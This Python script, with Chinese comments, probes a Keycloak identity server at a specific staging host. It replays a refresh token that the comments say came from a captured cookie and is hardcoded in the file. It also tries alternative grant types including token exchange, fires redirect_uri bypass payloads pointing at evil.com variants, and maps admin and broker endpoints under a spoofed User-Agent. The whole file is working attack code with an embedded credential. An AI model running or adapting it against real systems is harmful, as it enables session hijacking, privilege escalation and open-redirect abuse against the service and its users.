# -*- coding: utf-8 -*-
"""Keycloak 框架面深测(staging-realm + master realm):
1. openid-configuration 全量(两 realm)
2. refresh_token 换新 token(token 端点活性)
3. authorization 端点 redirect_uri 矩阵(neon-console client)
4. admin/broker 端点可达性"""
import http.client, ssl, json, time, urllib.parse

ctx = ssl.create_default_context()
KC = 'console-stage.neon.build'
REALM = 'staging-realm'
CLIENT = 'neon-console'

# 历史 keycloak_token cookie 里的 RefreshToken(HS512, exp 2026-09-10)
REFRESH = "eyJhbGciOiJIUzUxMiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJjMjMwZDA1Yi1kMzliLTQwZTUtYTY5Ny0wOWU0YWRlOTYxZTEifQ.eyJleHAiOjE3ODkwMjczOTcsImlhdCI6MTc4ODQyMjU5NywianRpIjoiY2RiYWRlNjAtMDFjMy00YjQxLWEyOWItODI0YTk3NWUxYWZkIiwiaXNzIjoiaHR0cHM6Ly9jb25zb2xlLXN0YWdlLm5lb24uYnVpbGQvcmVhbG1zL3N0YWdpbmctcmVhbG0iLCJhdWQiOiJodHRwczovL2NvbnNvbGUtc3RhZ2UubmVvbi5idWlsZC9yZWFsbXMvc3RhZ2luZy1yZWFsbSIsInN1YiI6IjJkNTQzNmZiLTdlYTEtNGFkYS05MDQ1LWZjMGQzZGViM2EwZCIsInR5cCI6IlJlZnJlc2giLCJhenAiOiJuZW9uLWNvbnNvbGUiLCJzaWQiOiJiNDVhNWIyMS1jNDdmLTQ2OGMtYTM5Mi1jZjFmZjIyMTM4NTUiLCJzY29wZSI6Im9wZW5pZCByb2xlcyBiYXNpYyBwcm9maWxlIGVtYWlsIHdlYi1vcmlnaW5zIGFjciJ9.HcKwiJBDss9g0yti0hbyvs-5ORBej37SRqo1Q6ngA53HFlC65JDgfndVyJzciGJ4kmQ4g9-ESV1MQd1yy7nYkA"

def req(path, method='GET', body=None, headers=None, host=KC):
    try:
        conn = http.client.HTTPSConnection(host, context=ctx, timeout=15)
        h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 'Accept': '*/*'}
        if body is not None:
            h['Content-Type'] = 'application/x-www-form-urlencoded'
        if headers:
            h.update(headers)
        conn.request(method, path, body=body, headers=h)
        r = conn.getresponse()
        raw = r.read()
        st = r.status
        hdrs = dict((k.lower(), v) for k, v in r.getheaders())
        conn.close()
        return st, raw.decode('utf-8', 'replace'), hdrs
    except Exception as e:
        return -1, 'EXC %s' % e, {}

print('=== [1] staging-realm openid-configuration ===', flush=True)
st, raw, hdrs = req('/realms/%s/.well-known/openid-configuration' % REALM)
if st == 200:
    d = json.loads(raw)
    for k in sorted(d):
        v = d[k]
        if isinstance(v, list):
            print('  %s: %s' % (k, ', '.join(str(x) for x in v)))
        elif isinstance(v, dict):
            print('  %s: %s' % (k, json.dumps(v)))
        else:
            print('  %s: %s' % (k, v))
print('\n=== [1b] master realm openid-configuration ===', flush=True)
st, raw, hdrs = req('/realms/master/.well-known/openid-configuration')
if st == 200:
    d = json.loads(raw)
    print('  authorization_endpoint:', d.get('authorization_endpoint'))
    print('  token_endpoint:', d.get('token_endpoint'))
    print('  grant_types:', d.get('grant_types_supported'))
    print('  response_modes:', d.get('response_modes_supported'))
    print('  code_challenge:', d.get('code_challenge_methods_supported'))
    print('  scopes:', d.get('scopes_supported'))
    print('  claims:', d.get('claims_supported'))
    print('  userinfo:', d.get('userinfo_signing_alg_values_supported'))

print('\n=== [2] refresh_token 换新 ===', flush=True)
body = urllib.parse.urlencode({
    'grant_type': 'refresh_token', 'client_id': CLIENT,
    'refresh_token': REFRESH,
})
st, raw, hdrs = req('/realms/%s/protocol/openid-connect/token' % REALM, 'POST', body)
print('-> %d | %s' % (st, raw[:400].replace('\n', ' ')), flush=True)
new_at = None
if st == 200:
    d = json.loads(raw)
    new_at = d.get('access_token')
    print('  new access_token head:', (new_at or '')[:80])
    import base64
    def dec(s):
        s = s.replace('-', '+').replace('_', '/')
        s += '=' * (-len(s) % 4)
        return base64.b64decode(s)
    if new_at:
        p = json.loads(dec(new_at.split('.')[1]))
        print('  payload: exp=%s iss=%s azp=%s sid=%s' % (p.get('exp'), p.get('iss'), p.get('azp'), p.get('sid')))
    # 顺便测其他 grant 类型(用同一 client)
    for g in ['client_credentials', 'password', 'urn:ietf:params:oauth:grant-type:token-exchange']:
        b2 = urllib.parse.urlencode({'grant_type': g, 'client_id': CLIENT,
                                     'subject_token': (new_at or 'x'), 'requested_token_type': 'urn:ietf:params:oauth:token-type:refresh_token'})
        st2, raw2, _ = req('/realms/%s/protocol/openid-connect/token' % REALM, 'POST', b2)
        print('  grant=%s -> %d | %s' % (g, st2, raw2[:150].replace('\n', ' ')), flush=True)
        time.sleep(0.3)

print('\n=== [3] authorization 端点 redirect_uri 矩阵 ===', flush=True)
cands = [
    'https://console-stage.neon.build/', 'https://console-stage.neon.build/api/auth/callback',
    'https://console-stage.neon.build/auth/callback', 'https://console-stage.neon.build/callback',
    'http://localhost:3000/', 'https://evil.com/', 'https://console-stage.neon.build.evil.com/',
    'https://console-stage.neon.build@evil.com/', 'https://console-stage.neon.build/%2f..%2fevil.com',
    'https://console-stage.neon.build//evil.com', 'https://console.evil.com/',
]
for ru in cands:
    p = '/realms/%s/protocol/openid-connect/auth?response_type=code&client_id=%s&redirect_uri=%s&scope=openid&state=zz1' % (
        REALM, CLIENT, urllib.parse.quote(ru, safe=''))
    st, raw, hdrs = req(p)
    loc = hdrs.get('location', '')
    if st == 302:
        print('[OK ] %s -> 302 %s' % (ru[:60], loc[:120]))
    else:
        snippet = raw[:120].replace('\n', ' ')
        print('[%s] %s -> %d %s' % ('?? ', ru[:60], st, snippet))
    time.sleep(0.25)

print('\n=== [4] admin/broker 可达性 ===', flush=True)
paths = [
    '/admin/', '/admin/realms', '/realms/%s/admin/realms' % REALM,
    '/realms/%s/protocol/openid-connect/registrations?client_id=%s&response_type=code&redirect_uri=%s&scope=openid' % (
        REALM, CLIENT, urllib.parse.quote('https://console-stage.neon.build/', safe='')),
    '/realms/%s/broker/google/token' % REALM,
    '/realms/%s/broker/google/endpoint' % REALM,
    '/realms/%s/broker/google/login' % REALM,
    '/realms/master/protocol/openid-connect/auth?response_type=code&client_id=admin-cli&redirect_uri=%s' % urllib.parse.quote('http://localhost:8080/', safe=''),
    '/realms/master/protocol/openid-connect/auth?response_type=code&client_id=security-admin-console&redirect_uri=%s' % urllib.parse.quote('http://localhost:8080/admin/master/console/', safe=''),
]
for p in paths:
    st, raw, hdrs = req(p)
    loc = hdrs.get('location', '')
    ct = hdrs.get('content-type', '')[:30]
    print('[%d] %s CT=%s loc=%s' % (st, p[:80], ct, loc[:100]), flush=True)
    time.sleep(0.25)
